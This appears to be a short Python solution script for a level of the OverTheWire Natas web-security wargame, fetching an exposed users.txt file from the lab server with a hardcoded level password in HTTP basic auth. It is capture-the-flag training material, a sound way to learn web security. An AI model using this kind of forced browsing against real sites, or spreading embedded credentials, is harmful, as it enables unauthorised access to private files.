import requests

r = requests.get(
    'http://natas2.natas.labs.overthewire.org/files/users.txt',
    auth=('natas2', 'TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI')
)
print(r.text)
